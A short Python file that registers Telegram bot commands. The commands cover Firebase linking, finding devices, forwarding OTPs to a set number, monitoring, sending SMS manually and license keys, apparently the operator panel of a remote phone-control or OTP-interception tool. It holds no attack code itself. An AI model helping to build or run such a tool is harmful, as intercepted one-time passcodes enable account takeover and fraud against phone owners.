from telegram import BotCommand


BOT_COMMANDS = [
    BotCommand("guide", "Sab commands guide"),
    BotCommand("setfirebase", "Firebase connect"),
    BotCommand("fdy", "Device find"),
    BotCommand("a", "Device find (KEY)"),
    BotCommand("mynum", "OTP forward number"),
    BotCommand("addchannel", "Channel set"),
    BotCommand("startmonitor", "Monitoring ON"),
    BotCommand("stop", "Monitoring OFF"),
    BotCommand("resume", "Monitoring resume"),
    BotCommand("status", "Current status"),
    BotCommand("key", "License KEY"),
    BotCommand("send", "Manual SMS"),
    BotCommand("ping", "Bot latency"),
    BotCommand("devices", "Active device"),
    BotCommand("allfirebase", "Bulk Firebase import"),
]


async def register_bot_commands(bot) -> None:
    await bot.set_my_commands(BOT_COMMANDS)
